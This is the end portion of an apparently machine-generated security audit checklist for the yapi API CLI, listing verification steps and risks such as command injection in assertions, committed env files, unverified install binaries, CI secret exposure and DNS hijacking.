**If wrong:** ⚠️ Arbitrary code executes on the user's machine with their shell privileges during installation — full system compromise possible

#### 2. [🔴 MUST] The yapi CLI's assert expression evaluator does not use shell exec, os/exec, or any eval-equivalent to process user-supplied assertion strings

**How to verify:** Review the Go source code in the cli/ directory at https://github.com/jamierpond/yapi — search for os/exec, exec.Command, and the assert/expression evaluation logic to confirm it uses a safe in-process parser

**If wrong:** ⚠️ A malicious API response could inject shell commands through the ${step.field} interpolation into assert expressions, achieving RCE on the machine running yapi

#### 3. [🔴 MUST] The .env.prod and similar env_files used with yapi are excluded from version control via .gitignore in projects using this skill

**How to verify:** Check the project's .gitignore file for entries covering .env.* or specific env_file names referenced in yapi.config.yml

**If wrong:** ⚠️ Production API keys and secrets are committed to the repository and exposed to all repository readers or publicly on GitHub

#### 4. [🟡 SHOULD] The goreleaser-produced checksums.txt is verified by the install scripts before executing downloaded binaries

**How to verify:** Read the install scripts at https://yapi.run/install/mac.sh and https://yapi.run/install/linux.sh and check whether they download and verify checksums.txt against the binary before executing

**If wrong:** ⚠️ A MITM or CDN compromise could serve a tampered binary that passes the install step without integrity verification

#### 5. [🟡 SHOULD] The AUR_SSH_KEY GitHub Actions secret is restricted to protected branches and not accessible in pull_request triggered workflows

**How to verify:** Review the GitHub Actions workflow files in .github/workflows/ of the yapi repository, specifically checking that release workflows using AUR_SSH_KEY are triggered only on push to protected branches, not on pull_request events

**If wrong:** ⚠️ A malicious pull request could exfiltrate the AUR SSH key and publish backdoored packages to the Arch Linux User Repository

#### 6. [🔵 NICE TO HAVE] The yapi.run domain has DNSSEC enabled and the TLS certificate is issued by a reputable CA with certificate transparency logging

**How to verify:** Run: dig +dnssec yapi.run to check DNSSEC. Check https://crt.sh/?q=yapi.run for certificate transparency logs.

**If wrong:** ⚠️ DNS hijacking or BGP hijacking could redirect install script downloads to attacker infrastructure without TLS warnings

---
*Generated by Skill Audit Agent V1 on 2026-03-25T08:29:05.561322+00:00*